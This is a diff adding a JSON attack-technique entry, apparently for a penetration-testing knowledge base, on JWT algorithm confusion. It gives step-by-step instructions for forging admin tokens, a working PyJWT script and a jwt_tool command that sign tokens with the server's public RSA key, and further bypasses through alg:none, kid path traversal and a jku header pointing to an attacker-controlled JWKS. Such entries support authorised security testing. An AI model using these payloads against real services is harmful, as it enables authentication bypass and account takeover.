@@ -1,0 +1,48 @@
+{
+  "id": "auth-jwt-algorithm-confusion",
+  "title": "JWT Algorithm Confusion Attack",
+  "category": "auth_bypass",
+  "tags": ["jwt", "authentication", "algorithm-confusion", "rsa", "hmac"],
+  "applicability": {
+    "technologies": ["node", "python", "java", "go", "ruby", "php"],
+    "contexts": ["api-endpoint", "authentication", "authorization-header"],
+    "preconditions": ["jwt-authentication", "asymmetric-key-verification"]
+  },
+  "technique": {
+    "summary": "When a server uses RSA to verify JWTs but doesn't enforce the algorithm, an attacker can switch the algorithm to HMAC and sign the token with the server's public RSA key (which is often publicly available). The server mistakenly uses the public key as the HMAC secret.",
+    "steps": [
+      "Obtain a valid JWT from the application",
+      "Decode the JWT and identify the algorithm (RS256, RS384, RS512)",
+      "Obtain the server's public RSA key (JWKS endpoint, /.well-known/jwks.json, or certificate)",
+      "Modify the JWT header to use HS256 instead of RS256",
+      "Modify the payload (e.g., change user role to admin, change sub claim)",
+      "Sign the modified token using the RSA public key as the HMAC secret",
+      "Submit the forged token and verify access"
+    ],
+    "payloads": [
+      {
+        "payload": "python3 -c \"\nimport jwt, json\npublic_key = open('public.pem').read()\npayload = {'sub': 'admin', 'role': 'admin', 'iat': 1700000000, 'exp': 1800000000}\ntoken = jwt.encode(payload, public_key, algorithm='HS256')\nprint(token)\n\"",
+        "encoding": "raw",
+        "context": "authorization-header",
+        "notes": "PyJWT script to forge token with algorithm confusion"
+      },
+      {
+        "payload": "jwt_tool <token> -X k -pk public.pem",
+        "encoding": "raw",
+        "context": "authorization-header",
+        "notes": "jwt_tool key confusion attack"
+      }
+    ],
+    "bypassTechniques": [
+      "If JWKS endpoint is used, extract the public key and convert to PEM format",
+      "Try alg:none attack (remove signature entirely)",
+      "Try kid parameter injection for path traversal to a known file",
+      "Try jku header injection to point to attacker-controlled JWKS"
+    ]
+  },
+  "references": [
+    "https://portswigger.net/web-security/jwt/algorithm-confusion",
+    "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
+  ],
+  "source": "portswigger-research"
+}
